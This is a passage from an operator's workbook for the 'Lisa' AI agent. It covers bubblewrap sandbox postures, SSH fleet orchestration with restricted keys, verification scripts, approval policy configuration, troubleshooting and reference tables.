$ bwrap ... --dev-bind /dev/null /dev/null ... -- python3 -c "import pty; pty.openpty()"
OSError: out of pty devices
```

So the practical guidance:

- **`device: minimal`** is the right choice for a box that SSHs. It gives
  the same real `/dev` (and working PTY) as `dev`, and it is the tighter of
  the two. The model cannot change it either way (§3.5).
- **`device: none`** breaks SSH's PTY path entirely — no PTY allocation, so
  OpenSSH's PTY request fails.

Note the *non-interactive* case: `ssh host 'command'` does not allocate a
PTY, so it works even under `device: none` (`ssh -V` runs fine there). If
your sandboxed Lisa only ever runs non-interactive SSH, `device: none` is
viable; if it may open an interactive session or a tool that allocates a
PTY, use `minimal`.

### 9.3 SSH key material must be readable inside the sandbox

Inside the sandbox, `/` is bound **read-only** at its real path. Your
`~/.ssh` directory is therefore visible and readable, provided the sandbox
runs as a user that can read it.

- **Your SSH config, keys, and `known_hosts` are all available** to the
  model inside the sandbox. The read-only bind prevents *modification*, not
  *reading*.
- **A `ssh-agent` socket works** — a Unix domain socket under a read-only
  bind is still connectable. (Note: binding the agent's directory
  read-write *breaks* the connection — the socket inode is replaced by the
  bind, so the peer sees a different socket. Bind the *parent path*
  read-only and leave the socket alone.)

  One caveat: `SSH_AUTH_SOCK` is an environment variable, and the sandbox
  inherits the environment from the host process. It is not exported by
  default in a login shell, so you may need to export it in the Lisa
  environment, or rely on the key files directly.
- **SSH host key verification still applies.** `known_hosts` is read-only,
  so the model cannot suppress a host-key warning by writing to it. This is
  a genuine security property: a MITM on the outbound SSH path will still be
  surfaced to the operator. Do not disable `StrictHostKeyChecking`.

### 9.4 Scoping the SSH key — the real remaining risk surface

Once `network: allow` is on, the sandboxed Lisa can reach anything the SSH
credential authorizes. **The containment boundary you have lost is the
network boundary, and the key is what stands in for it.**

Recommendations:

- **A dedicated key for Lisa**, not your personal one. It should be
  authorized on the managed nodes with a restricted `authorized_keys`
  entry:

```text
  command="/usr/local/bin/lisa-remote-guard",restrict,no-agent-forwarding,no-port-forwarding,no-X11-forwarding,no-pty <key-type> <key>
  ```

  The `restrict` keyword disables port/X11/agent forwarding and PTY
  allocation, which prevents a compromised control box from pivoting
  further. The `command=` wrapper lets you constrain what the key may do.

  Caveat: `no-pty` breaks interactive SSH, which is fine for scripted
  `ssh host 'command'` usage, but if you want Lisa to run interactive
  commands on a node, you need PTY. In that case use
  `no-agent-forwarding no-port-forwarding no-X11-forwarding` without
  `no-pty`.

- **Do not forward the agent.** `ssh -A` exposes your agent to the remote
  host, and from there to anything that host can reach. The `restrict`
  keyword's `no-agent-forwarding` covers this.

- **A `ProxyCommand`/bastion pattern** is available if the managed nodes
  are not directly reachable.

### 9.5 Making the SSH fan-out efficient

`bash_run` accepts a batch of independent commands (`commands`, capped at 8)
and, in the bare/ephemeral/readonly regimes, `when: "auto"` **parallelizes**
them. Overlay capture always serializes (a single overlay upper dir cannot
take concurrent writers), so:

- For *read-only* fan-out across the fleet, use `commands` with parallel
  scheduling. Under `persistence: overlay`, they will serialize — which is
  correct for correctness but slow.
- If you want fast parallel fleet reads *and* the capture posture, split the
  work: read-only fleet survey in one parallel batch, and the mutating work
  in a separate, serialized, capture-mode batch.

The bash pack's `session_state` with `functions: allowlist` is the lever
that makes this ergonomic: define a `fleet_status()` helper once, and it
carries across every subsequent call in the conversation.

### 9.6 A concrete example

```text
lisa prompt "/shell survey the fleet: for each node in node-1 node-2 node-3, report uptime, load, and free disk"
```

The model runs something like (as a batch, parallel):

```bash
ssh -o BatchMode=yes -o ConnectTimeout=5 node-1 'uptime; free -m | head -2'
ssh -o BatchMode=yes -o ConnectTimeout=5 node-2 'uptime; free -m | head -2'
ssh -o BatchMode=yes -o ConnectTimeout=5 node-3 'uptime; free -m | head -2'
```

`-o BatchMode=yes` is worth insisting on in your instruction body: it makes
SSH fail fast instead of hanging on a password prompt. Without it, a
misconfigured key turns into a hung command that consumes the turn's
timeouts. The sandbox's auto-backgrounding will eventually adopt it as a
job, but a fast failure is much better.

---

## Orchestration patterns

These patterns use the fleet architecture of Stage 5 well, but several (the
tiered ladder, two-phase commits) are worth adopting at Stages 2–3 too.

### The tiered command ladder

Make the control-box Lisa think in three tiers, and have it state which tier
it is operating at before acting:

| Tier | Mechanism | Use for |
| --- | --- | --- |
| **T1 — Observe** | Sandbox, default posture (no overrides) | `journalctl`, `systemctl status`, `ss`, `ip a`, `dmesg`, `cat /proc/*` |
| **T2 — Stage** | Sandbox, `overrides: {persistence: overlay, paths: {…: capture}}` | Config edits to `/etc`, `/opt/control` — reviewed and applied |
| **T3 — Act** | SSH to a managed node, or the `rw` mount | Service restarts, package ops, real fleet changes |

The instruction body should encode this ladder explicitly:

> Diagnose at T1 first — read logs and state before changing anything. When
> you identify a config change, make it at T2 (ask for the overlay posture
> and name the paths to capture) and report the `layer_id` for review. When
> the change requires a real service action (restart, reload, rollout), do
> it at T3 over SSH and report the node's actual output.

This single instruction does more for safety than any policy rule, because
it makes the *model* choose the least-privileged mechanism that works — and
because T1 needs no `overrides` at all, most of the work stays in the
tightest posture.

### Two-phase execution with a verified rollback

Have the control-box Lisa use the node's trusted Lisa for a change that is
**prepared, verified, and then committed**:

1. Control-box Lisa: stage the config change locally (T2, `capture`).
2. Control-box Lisa: `scp`/write it to the node's staging path.
3. Node Lisa (trusted, over SSH): validate it — `systemd-analyze verify`,
   the service's own `--check` flag, `nginx -t`, `named-checkconf`.
4. Node Lisa: **snapshot the current file** (`cp -a current current.bak`)
   and then atomically install the new one (`mv`).
5. Node Lisa: `systemctl reload` (not `restart` — reload is cheaper and
   usually sufficient).
6. Node Lisa: **health check** — service active, logs clean, endpoint
   responding.
7. If the health check fails: **restore from the `.bak` and roll back**,
   then report.

The trust on the node makes steps 3–6 fast and unattended. The staging on
the control box keeps the *content* of the change reviewable. This is the
pattern that makes "trusted" safe in practice.

### Fleet-wide fan-out with a conservative blast radius

The control-box Lisa can survey the whole fleet in parallel (read-only),
then act on the subset that needs it:

```text
T1  parallel: ssh <each node> 'systemctl is-active <svc>; journalctl -u <svc> -n 20 --no-pager'
    → identify the 2 of 40 nodes that are actually unhealthy

T2  stage the fix on the control box (capture layer), review the diff

T3  apply to just those 2 nodes, one at a time, with a health check between
    each. If node A's health check fails, stop — do not proceed to node B.
```

The "one at a time, stop on failure" rule is what separates this from a
naive `for` loop that turns one bad change into forty.

### Delegating reasoning to the node's own Lisa

The most interesting orchestration capability is that a managed node's own
trusted Lisa (Stage 4) is *itself* an agent with full access. The control
box's Lisa can therefore delegate *reasoning* to the node's Lisa, not just
execution:

```bash
ssh node-3 "lisa prompt '/shell why is mysqld refusing connections? inspect logs, config, and socket state'"
```

The node's Lisa has the ground truth of that node — its actual config, its
actual logs, its actual socket state — and it can act on it. The control
box's Lisa is reasoning across the fleet; the node's Lisa is reasoning
*about* the node.

**The design goal, stated explicitly:** the control box's Lisa should
delegate node-local diagnosis to the node's Lisa, and reserve its own
sandbox for cross-fleet reasoning and staging.

Practical notes:

- The node's `lisa` must be installed and on `PATH` for the SSH user.
- The node's Lisa runs bare and trusted, so its output needs a trust
  boundary of its own: it is the *node's* agent speaking, not a human.
  Consider having the node's Lisa write its findings to a file that the
  control box reads over the mounted filesystem, rather than trusting
  free-form stdout.
- Set a wall-clock bound on the delegated call so a wedged node does not
  hang the control-box turn:
  `ssh -o ConnectTimeout=5 node-3 'timeout 120 lisa prompt "..."'`.
- The node's Lisa has its own model budget. A delegation that triggers a
  long investigation can burn a lot of tokens; keep delegated prompts
  narrow.

### Two-Lisa consensus on risky changes

For the highest-risk changes, use both agents as a cross-check:

1. Control-box Lisa (T2): stage the change, produce a diff.
2. Node Lisa (trusted): inspect the node's actual current state and report
   whether it is safe to apply ("this changes `max_connections` from 100 to
   500, but the node's memory budget cannot support that — recommend 250").
3. Control-box Lisa: reconcile, restage, and present the final diff to you.
4. You: apply (via `layers_apply` on the control box, or a direct write on
   the node).

The node's Lisa is a *reviewer with ground truth*, not just an executor.
This is the pattern that makes the two-Lisa split genuinely additive rather
than redundant.

### An incident "war room" session

For an active incident, a dedicated session with a tailored plan:

- `execution.max_model_calls` raised (30 → 80) and `max_wall_ms` raised.
- `surface.memory_scope: shared` if multiple operators should see it.
- Floor: `execution: sandbox`, `persistence: overlay`, `network: allow`,
  `device: minimal`, and a **wider `paths` grant** — during an incident you
  may legitimately need `/var/log` read-only, `/mnt/managed` read-write, and
  possibly `/srv` or a service-specific directory `rw`. (`capture` paths are
  still requested per call, not floor-pinned — see §3.3.)
- The instruction body relaxes its "state what you will do" verbosity
  requirement — during an incident, narrate *as you go* rather than
  announcing each command in advance.

Keep the incident session's floor **separate** from the daily-operations
session's floor. Two session plans, two `LISA_SESSION_CONTEXT_PATH` values,
two data-dir profiles:

```bash
lisa --profile incident prompt "/shell ..."     # wide-open incident floor
lisa --profile daily prompt "/shell ..."        # tight daily floor
```

`LISA_PROFILE=name` resolves to a profile data dir with its own
`config/policy.yaml`. This is the cleanest way to have "trusted" and
"contained" coexist on one machine without ambiguity.

### Scheduled health checks

A cron-driven headless run against the fleet, using the *contained*
control-box profile:

```bash
# /etc/cron.d/lisa-fleet-check
*/15 * * * * lisa --profile daily prompt "/shell survey all nodes for failed units and recent errors; report only" 2>&1 | tee -a /var/log/lisa-fleet.log
```

Two refinements worth making:

- Use a **separate profile** with `mode: ask` for unattended runs, so a
  genuinely mutating command surfaces as a prompt rather than acting.
  Unattended + `trust` + bare is the combination that causes incidents.
- Keep the prompt read-only. The model can be told to report only.

### Make the trust boundary visible in the tooling

A `fleet_status()` helper that reports the *posture* alongside the data
prevents a whole class of confusion:

```bash
fleet_status() {
  echo "control-box posture: $(cat ~/.lisa/run/*/sandbox-facts.json | jq -r .containment)"
  for n in node-1 node-2 node-3; do
    printf '%s: ' "$n"
    ssh -o BatchMode=yes -o ConnectTimeout=5 "$n" \
      'cat ~/.lisa/run/*/sandbox-facts.json 2>/dev/null | jq -r .containment || echo "no-lisa-on-node"'
  done
}
```

Enable function replay for it in the bash pack's `session_state`, and the
model has it available every turn. This turns "is this command contained?"
from a question the operator has to ask into something visible in the
transcript.

### A note on orchestration *frameworks*

If you already run something like Ansible, Salt, or a custom orchestrator,
do not replace it with Lisa — **drive it from Lisa**. The sandboxed control
box at T1/T2 is an excellent *planner and driver*: it can read the desired
state, compute the delta, and hand a concrete plan to the existing
orchestrator, which is already trusted to execute it. Lisa's contribution is
the reasoning; your orchestrator's contribution is the well-tested
convergence. This is a much smaller blast radius than teaching Lisa to
converge a fleet itself.

---

## Verification cookbook

Ordered from cheapest to most thorough. Run the first one after Stage 0 and
the rest as your stage demands.

### Verify the overlay chain end to end

The single most useful test, because it exercises the *exact* chain the pack
uses — not an approximation:

```bash
#!/usr/bin/env bash
# verify-bwrap-chain.sh
set -euo pipefail

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
mkdir -p "$WORK"/{lower,upper,work,merged}
echo "original" > "$WORK/lower/probe.txt"

unshare --user --map-root-user --mount -- /bin/sh -c "
  mount -t overlay -o userxattr,\
lowerdir=$WORK/lower,upperdir=$WORK/upper,workdir=$WORK/work overlay $WORK/merged
  exec bwrap --unshare-pid --unshare-uts --unshare-ipc --unshare-net \
    --ro-bind / / --proc /proc --dev /dev --tmpfs /tmp \
    --bind $WORK/merged $WORK/merged --cap-drop ALL --die-with-parent --new-session -- \
    /bin/sh -c '
      cat $WORK/merged/probe.txt
      echo MUTATED >> $WORK/merged/probe.txt
      id
    '
"

echo "--- live (lower) content, must be UNCHANGED ---"
cat "$WORK/lower/probe.txt"
echo "--- captured (upper) content, must contain MUTATED ---"
cat "$WORK/upper/probe.txt"
```

Expected output:

```text
original
uid=0(root) gid=0(root) groups=0(root),65534(nobody)
--- live (lower) content, must be UNCHANGED ---
original
--- captured (upper) content, must contain MUTATED ---
original
MUTATED
```

This exact chain was run on a test host (openSUSE Tumbleweed, kernel 7.2,
bubblewrap 0.12.0) and produced exactly that output. If your host differs,
you have found your problem before Lisa did.

### Verify the posture in a live session

```bash
lisa prompt "/shell echo posture-check; id; cat /etc/hostname"
```

Read the result stamp:

| Stamp | Meaning | Action |
| --- | --- | --- |
| `sandboxed: true`, `backend: "overlay"` | Correct for a contained host | Proceed |
| `sandboxed: true`, `backend: "tmpfs"` | Overlay may be unavailable, or the model did not request capture — check the call's overrides | Proceed if the ephemeral posture was intended |
| `sandboxed: false`, `mode: "bare"` | Floor says `sandbox` but you got bare | Check `providers.capabilities.sandbox` and that the bwrap pack is registered |
| `sandboxed: false` + `missing` | Sandbox registered but cannot run | See [failure modes](#failure-modes-and-troubleshooting) |

### Verify the fact the host reads

Contained host:

```json
{ "tool_id": "bash_run", "containment": "contained", "reasons": [],
  "probed_at": "...", "floor_posture": { "execution": "sandbox", "persistence": "overlay" } }
```

Note there is no `capture_paths` entry: that field is only populated when a
`capture` path is pinned in the **floor**, and per §3.3 you should not do
that. With the recommended floor it is simply absent.

Trusted (Stage 4) host:

```json
{ "tool_id": "bash_run", "containment": "deliberate_bare", "reasons": [],
  "floor_posture": { "execution": "bare", "persistence": "direct-write" } }
```

### Verify the policy

```bash
lisa policy                    # show the active document + any load errors
lisa policy rule list          # allow/ask/deny rules with remove addresses
```

The policy engine re-reads the file on every approval request, so there is
no "reload" step — the output of `lisa policy` is the live state. Full rule
authoring reference: [POLICY_GUIDE.md](POLICY_GUIDE.md).

### Verify SSH from inside the sandbox

```bash
lisa prompt "/shell ssh -o BatchMode=yes -o ConnectTimeout=5 node-1 'hostname; uptime'"
```

If this fails, the diagnosis order is:

1. Does it work *outside* the sandbox? `ssh node-1 'hostname'` in a normal
   shell. If not, it is an SSH problem, not a sandbox problem.
2. Is `network: allow` in the floor? (`deny` refuses the model's request
   outright — that is the floor working.)
3. Did the model *request* `overrides: {network: allow}`? The floor permits
   it; the model must ask (§3.1). A `--unshare-net` in the argv means it
   did not.
4. Is `device` set to `minimal` (not `none`)? `none` breaks PTY allocation.
5. Is the key readable by the sandbox's user?
6. Is `StrictHostKeyChecking` rejecting an unknown host? Add the key to
   `known_hosts` on the host *before* the session starts — `known_hosts` is
   read-only inside the sandbox, so the model cannot accept a new host key
   itself.

---

## Operational runbook

### Startup checklist — any contained host (Stages 1–3, 5 control box)

```bash
# 1. Host prerequisites
bwrap --version && unshare --version | head -1
sysctl kernel.unprivileged_userns_clone 2>/dev/null || echo "(non-Debian: OK)"

# 2. Overlay chain (see the verification cookbook)
./verify-bwrap-chain.sh

# 3. Any mounts the floor grants (fleet setups only)
mount | grep /mnt/managed
df -h /mnt/managed/*

# 4. Lisa sees the plan
lisa verify

# 5. Policy
lisa policy

# 6. Live posture
lisa prompt "/shell echo ok"   # check the stamp
```

### Startup checklist — a trusted host (Stage 4 / fleet nodes)

```bash
# 1. Lisa installed
which lisa && lisa --version

# 2. The plan selects the bwrap pack AND pins execution: bare.
#    Both are required: a missing floor hard-fails the shell (§3.7, §4.3).
grep -A6 'sandbox:' ~/.lisa/config/session_context.md
grep -A2 'capabilities:' ~/.lisa/config/session_context.md
#   expect:  floor: { execution: bare, ... }
#   expect:  capabilities: { sandbox: lisa-pack-bwrap }

# 3. The policy trusts
lisa policy
#   mode: trust
#   bare_requires_approval: false

# 4. The posture is deliberate_bare
cat ~/.lisa/run/*/sandbox-facts.json 2>/dev/null | jq -r .containment

# 5. A command actually runs, unattended
lisa prompt "/shell systemctl is-active sshd && uptime"
```

### Routine: applying a staged layer

The contained-host flow for a reviewed change:

1. Lisa stages the change and reports the `layer_id`.
2. Export it (the `layers_export` operation); output lands in
   `~/.lisa/run/layers-exports/<layer_id>/` with `<file>.diff`,
   `inventory.json`, and `manifest.json`.
3. **Read the diffs.**
4. Apply via `layers_apply` with the `layer_id`. It runs immediately, by
   design, the moment you invoke it — `layers_apply` never consults the
   approval engine (see [Stage 2 §2.5](#25-the-review-and-apply-ritual)).

**The model must never run the apply on its own initiative.** Enforce it in
the instruction body; the gate is the workflow contract, not a policy rule.

### Routine: rolling a change to the fleet

```bash
# 1. Prepare on the control box (T2) — capture layer
# 2. Review the diff
# 3. Apply to node-1 via the node's trusted Lisa
ssh node-1 'sudo install -m644 /tmp/new.conf /etc/myapp.conf && sudo systemctl reload myapp && systemctl is-active myapp'
# 4. Health check
ssh node-1 'curl -sf http://localhost:8080/healthz || echo HEALTH-FAILED'
# 5. Only if the health check passes, proceed to node-2
```

### Rotation and hygiene

- **Rotate the Lisa SSH key** on a schedule; the key is the real boundary
  once `network: allow` is on.
- **Prune capture layers.** `<data_dir>/cache/layers/` accumulates. Old
  layers are inert but they are also a record of every change the model
  proposed, including bad ones.
- **Rotate the SSH agent** if you forward it; the managed nodes'
  `authorized_keys` should be reviewed periodically.
- **Review the policy file** for accumulated `--remember` rules. Each
  `lisa approve <id> --remember "git status"` writes a persistent allow rule
  scoped to a command prefix. Over time these accumulate; audit them with
  `lisa policy rule list`.
- **Watch the auto-approve cap.** If a turn hits 10 auto-approvals, the
  model is looping. That is a signal, not a nuisance.

---

## Failure modes and troubleshooting

### The shell hard-fails instead of running

**Symptom**: `The sandbox floor for this session requires contained
execution (execution=sandbox), but the sandbox cannot run: ...`

**Meaning**: This is the pack working *correctly*. A floor that mandates
`sandbox` never degrades to bare silently. The error carries a `missing`
list naming the actual blocker:

| `missing` says | Fix |
| --- | --- |
| `bubblewrap capability probe is unavailable` | The bwrap pack is not installed in the Lisa environment |
| `bwrap` binary not found | `apt/dnf/zypper/pacman install bubblewrap` |
| userns disabled | `sysctl kernel.unprivileged_userns_clone=1` |
| overlay mount denied by kernel/LSM | Enable unprivileged overlay, or adjust SELinux/AppArmor |
| `unshare` not found | `install util-linux` |
| the bwrap stage is the blocker | A bubblewrap build rejecting an emitted flag — **no sysctl fixes this**; the sandbox still works with ephemeral tmpfs; do not retry `persist`/`layer_id` |

The same class of failure occurs on a trusted host when the **floor is
missing** — no bwrap pack selected, or no `providers.capabilities.sandbox`.
A missing floor reads as "not evidence of consent to run bare" and fails
closed (§3.7).

### Writes are disappearing

| Reported posture | Diagnosis |
| --- | --- |
| `backend: "tmpfs"`, `persistence: "ephemeral"` | The model did not request capture on this call, or overlay is unavailable. Writes went to tmpfs and were discarded — expected behavior at the default posture (§3.1). |
| `backend: "overlay"` but the live file is unchanged | **Correct behavior.** The change is staged. Look for the `layer_id` and export it. |
| `degraded: true` with a `note` | The overlay was requested but the host cannot do it; it fell back to ephemeral and *said so explicitly*. |
| `sandboxed: false`, `mode: "bare"` | You are on the host. Writes are real. |

### SSH hangs or fails from inside the sandbox

Diagnose in this order:

1. **Does it work outside the sandbox?** `ssh node-1 hostname` in a plain
   shell. If not, it is not a sandbox problem.
2. **`network: allow` in the floor?** `deny` = no route at all, and the
   model's request is refused.
3. **Did the model request `overrides: {network: allow}`?** The floor
   permits it; the model must ask (§3.1).
4. **`device: minimal`, not `none`?** `none` breaks PTY allocation.
5. **`BatchMode=yes`?** Without it, a missing key hangs on a password
   prompt instead of failing.
6. **`known_hosts` populated?** Add the host keys *before* the session
   starts — `known_hosts` is read-only inside the sandbox, so the model
   cannot accept a new host key itself.
7. **Key readable?** `ls -l ~/.ssh/id_ed25519` from inside the sandbox.
8. **`ssh-agent`:** if you use one, export `SSH_AUTH_SOCK` in the Lisa
   environment. Do not bind the agent's directory read-write — that breaks
   the socket.

### Lisa writes to the wrong place / captures too much

The overlay capture root is the **workspace root**, resolved from the
session pack configuration via `sdk.workspace.resolve_workspace_root`
(lenient mode: falls back to CWD, then `data_dir`, then home). It is *not*
`~/.lisa` — that was a historical bug, fixed. If the capture root is not
what you expect, set the workspace explicitly in the session's pack
configuration.

### The model reports `nobody:nobody` everywhere

Not a bug. It is the single-entry uid map (§2.5). Use `ls -n` /
`stat -c %u:%g`. Never `chown`/`chmod` to "fix" it inside the sandbox.

### Approvals still appear

| Cause | Which setup | Fix |
| --- | --- | --- |
| `bare_requires_approval: true` | Trusted host | `lisa policy bare off` |
| `mode: ask` not `trust` | Any | `lisa policy mode trust` |
| The action's effect is `external_write` | Any | **Expected.** Trust never auto-allows it. Add an explicit `allow` rule scoped to that tool. |
| A specific `ask` rule matched | Any | `lisa policy rule list` — find and remove it. |
| An explicit `deny` rule matched | Any | The action is blocked (not prompted). Review the rule. |
| The turn hit the 10-auto-approval cap | Any | Expected backstop; hard-coded, not configurable. A runaway loop should prompt. |
| Containment `degraded` on a contained host | Contained host | **Expected — fail closed.** The sandbox broke; fix the host (see above). |

### The model claims a change was applied when it was only staged

This is the most important model-facing failure, and the pack has explicit
guardrails for it (`layer_review.md`):

- Never describe a staged change as merged, applied, or permanent until
  `layers_apply` actually ran.
- Relay the `layer_id`; never invent an apply.
- The `layers_apply` operation is user-invoked.

Reinforce it in the session's instruction body. The pack's tool description
also carries it: "Overlay results are STAGED, never applied."

---

## Appendix: reference material

### The containment axes, complete

| Axis | Values (loosest → tightest) | Effect in the bwrap argv |
| --- | --- | --- |
| `execution` | `bare`, `sandbox` | `bare` = no bwrap; `sandbox` = the full argv |
| `persistence` | `direct-write`, `overlay`, `ephemeral`, `readonly` | selects the backend (overlay vs tmpfs) and the writable set |
| `network` | `allow`, `deny` | `deny` → `--unshare-net` |
| `device` | `dev`, `minimal`, `none` | `none` → `--dev-bind /dev/null /dev/null`; otherwise `--dev /dev` |
| `ipc` | `shared`, `unshared` | `unshared` → `--unshare-ipc` |
| `tmpfs_budget_bytes` | int ≥ 0 | `--size N --tmpfs /tmp` |
| `timeout_ceiling_seconds` | int ≥ 0 | parsed and joined, but **not enforced** on the child (§3.6) |
| `paths` (per path) | `rw`, `capture`, `ro`, `hidden` | `rw` → `--bind`; `ro` → `--ro-bind`; `hidden` → omitted; `capture` → overlay-owned |

**Floor semantics, restated (see §3 for the full treatment):**

- The floor is a **ceiling**. `network: deny`, `persistence: overlay`, and
  the `paths` access levels are *enforced* — a model request to go looser is
  a `PolicyError`.
- The floor's *permissive* scalar values (`network: allow`, `device: dev`,
  `ipc: shared`, `persistence: overlay` as a grant) are **permissions, not
  grants** — the model must still request them per call.
- `paths` is the exception: the floor's path grants **are** applied
  directly.
- `device` and `ipc` are **floor-only** — the model cannot set them at all.
- Pinning a `capture` path in the floor makes ordinary commands fail loudly
  (§3.3). Request `capture` per call instead.

### The `bash_run` parameters

| Parameter | Type | Default | Notes |
| --- | --- | --- | --- |
| `command` | string | — | Mutually exclusive with `commands`; 1–10 000 chars |
| `commands` | list[string] | — | Up to 8 independent commands; not valid with `run_in_background` |
| `when` | `auto` \| `parallel` \| `serial` | `auto` | `auto` parallelizes in bare/ephemeral/readonly, **serializes under overlay** |
| `timeout_seconds` | int | `30` | 1–300; the *visible wait* — a foreground timeout auto-backgrounds rather than killing |
| `run_in_background` | bool | `false` | Returns a `job_id`; not valid with `commands` |
| `persist` | bool | `false` | Retain the capture layer past the session |
| `layer_id` | string | `""` | Explicit overlay layer id; selects the overlay posture |
| `overrides` | object | `{}` | Tightening-only: `persistence`, `network`, `paths` (`rw`/`capture`/`ro`/`hidden`). **`device` and `ipc` are not model-settable.** |

### The `bwrap_run` parameters

| Parameter | Type | Default | Notes |
| --- | --- | --- | --- |
| `argv` | list[string] | **required** | Command + args |
| `timeout_seconds` | int | `60` | 1–3600; subject to the floor's ceiling |
| `cwd` | string | `""` | Must resolve under the capture root, scratch, a writable path, or a captured path |
| `overrides` | object | `{}` | Same axes as `bash_run` |
| `persist` | bool | `false` | Retain the layer past the session |
| `layer_id` | string | `""` | Explicit layer id |

### The approval policy document

```yaml
version: 1                 # int, default 1
mode: ask | trust | plan   # default: ask
sandbox_downgrade: true    # default: true — auto-approve contained execute
bare_requires_approval: true  # default: true — prompt for unsandboxed execute
allow: []                  # list of rules
ask: []
deny: []
```

Rule matchers (all present ones must match — AND):

| Matcher | Meaning |
| --- | --- |
| `tool` | Exact tool id (e.g. `bash_run`) |
| `effect` | `read` \| `write` \| `execute` \| `external_write` |
| `pack` | Exact owning pack id |
| `command_prefix` | The command string starts with this |
| `when` | A CEL boolean expression |

CEL bindings available in `when`:

| Binding | Type | Meaning |
| --- | --- | --- |
| `action.tool` | string | The tool id |
| `action.effect` | string | The effect kind |
| `action.pack` | string | The owning pack id |
| `action.command` | string | The extracted command string, or empty |
| `action.argv` | list\<string\> | The command tokens (`shlex.split` of the command) |
| `action.parameters` | map | The full parameter mapping |
| `identity.workspace_id` | string | |
| `identity.user_slug` | string | |
| `identity.surface_id` | string | |
| `identity.surface_type` | string | |
| `identity.mode_id` | string | |
| `identity.memory_scope` | string | |
| `containment` | string | `contained` \| `degraded` \| `none` \| `unknown` |

Authoring details, fail-closed semantics, and the runtime management
commands: [POLICY_GUIDE.md](POLICY_GUIDE.md).

### The session plan skeleton

```yaml
schema_version: 2
name: <nonempty>

surface:
  type: <nonempty string>       # e.g. personal_dm, team_channel
  id: <nonempty string>
  memory_scope: <nonempty>     # e.g. personal, shared

resources:
  packs:
    include: []
    exclude: []
    required: []
    configuration:
      <pack-name>:
        <pack-specific config>
    auto_install:
      <pack-name>:
        source: <path | name | git+https://...@ref>
        pin: <tag|branch|sha>
        editable: true

providers:
  modes: {}
  operations: {}
  tools: {}
  capabilities:
    sandbox: <pack-name>       # the sandbox implementation owner

routing:
  start_mode: default
  aliases: {}
  priority_adjustments: {}
  hints: {}
  sequential_connectors: []
  resume_phrases: []
  producer_intents: []
  consumer_intents: []
  topic_abandonment_markers: []

execution:
  max_model_calls: 1
  max_capability_calls: 1
  max_total_tokens: 1
  max_completion_tokens: 1
  max_wall_ms: 1
  max_session_tokens: 1
  force_final_on_exhausted: true
  capabilities:
    <capability>:
      max_invocations_per_turn: 1
      max_internal_tool_calls: 1
  scopes: {}

instructions:
  fragments:
    - ref: <path>
      modes: []
      stages: []
      position: before_mode | after_mode | after_stage
      required: true

context:
  models:
    path: models.yaml
  lanes: []
  sources: []
  ranking: {}
  budget: {}
  history: {}
  conflict_policy: prefer_authority | surface_conflict | drop_lower_authority
```

### Data directory layout

```text
<data_dir>/                        # default ~/.lisa
├── config/
│   ├── session_context.md         # the session plan
│   ├── policy.yaml                # the approval policy
│   └── models.yaml                # the model manifest
├── run/
│   ├── <session_key>/
│   │   ├── sandbox-facts.json     # the containment fact the host reads
│   │   ├── bash-<session_key>.log # the bash session audit log
│   │   ├── bwrap-<session_key>.log# the sandbox audit log
│   │   ├── profile/               # the rendered rc + state file
│   │   └── scratch/               # host-visible writable scratch
│   └── layers-exports/<id>/       # exported layer diffs + inventory
├── cache/
│   └── layers/<layer_id>/
│       ├── manifest.json          # target key -> live path map
│       └── targets/<key>/
│           ├── upper/             # the captured writes
│           └── work/              # overlayfs kernel scratch
└── logs/
```

`session_key` is a hash of `(workspace_id, user_slug, session_plan_digest,
surface_id)`. Changing your session plan changes the digest and therefore
the key — which is why the containment fact is published per-turn rather
than once at session creation.

### CLI reference

```text
# session selection
lisa --session-context /path/to/session_context.md prompt "..."
LISA_SESSION_CONTEXT_PATH=/path/to/session_context.md lisa prompt "..."
lisa --profile incident prompt "..."          # profile data dir, own policy.yaml

# policy
lisa policy                                    # show the document
lisa policy mode ask|trust|plan
lisa policy bare on|off
lisa policy rule list
lisa policy rule add allow|ask|deny [--tool T] [--effect E] [--pack P] [--prefix S] [--when CEL]
lisa policy rule remove allow:1

# approvals
lisa approve <request-id> [--remember "<prefix>"]
lisa deny <request-id>

# packs
lisa pack list | install <spec> | uninstall <pkg> | update [--all]

# diagnostics
lisa verify
lisa debug [N] | last [N]
lisa stalls
lisa retry <id>
lisa resume
```

### Known upstream documentation inconsistencies

While preparing this workbook, three places where the **bwrap pack's own
README does not match the code** turned up. They are worth knowing about,
because a reader who trusts the README will build a broken floor:

| # | The README says | The code does | Consequence |
| --- | --- | --- | --- |
| 1 | The Tier-2 admin example floors `persistence: overlay` **and** `paths: {/etc: capture}` together | The floor's `persistence: overlay` does not survive the join with the default posture, so the effective persistence is `ephemeral`, and the capture path then makes **every ordinary command fail** with a `PolicyError` | Request `capture` per call instead of floor-pinning it (§3.3) |
| 2 | "If the user intentionally wants unsandboxed execution … they can remove or disable the `lisa-pack-bwrap` pack; `bash_run` then runs on the host directly" | With the pack absent, there is no floor, and `_floor_requires_sandbox` returns `True` for a missing floor — the shell **hard-fails** with `SandboxRequiredButUnavailable` | Select the bwrap pack and pin `execution: bare` instead (§3.7, §4.3) |
| 3 | `layers_export` writes to `<data_dir>/runs/layers-exports/<id>/` | The code writes to `<data_dir>/run/layers-exports/<id>/` (`RUN_DIR` is `"run"`, singular) | Use the `run/` path when looking for exported diffs |

The pack's own test suite covers the *request-side* capture path but not a
floor-pinned one, which is why #1 went unnoticed.

---

## Summary: the trust spectrum in one page

| Stage | Floor | Policy | Command lives in | Writes |
| --- | --- | --- | --- | --- |
| 1 — Sealed observer | `execution: sandbox`, `persistence: readonly`, `network: deny`, `device: none`, logs `ro` | defaults (`ask`) | sealed sandbox | impossible by construction |
| 2 — Staged | `execution: sandbox`, `persistence: overlay` (ceiling), `device: minimal` | `trust` + `sandbox_downgrade`; bare guard ON | sealed sandbox | capture layer; human applies |
| 3 — Real writes | Stage 2 + `paths: {/srv/shared: rw}` | as Stage 2 | sealed sandbox | real to granted paths; layered elsewhere |
| 4 — Trusted host | `execution: bare`, `persistence: direct-write` | `trust` + `bare off` | the host | everywhere, immediate |
| 5 — Fleet | control box = Stage 2/3 + `network: allow` + `/mnt/managed: rw`; nodes = Stage 4 | control box `trust` + bare guard ON + narrow `deny`; nodes `trust` + bare off | contained on the control box, bare on the nodes | staged at the control plane, real at the nodes |

**The single most important fact (see §3):** the floor is a **ceiling**, not
a grant. `network: allow` in the floor *permits* the model to ask for
network; the model still has to ask. `paths` is the exception — it genuinely
grants, and it is where you express "as privileged as it can/should safely
be." Pinning `capture` paths in the floor is a trap: it makes ordinary
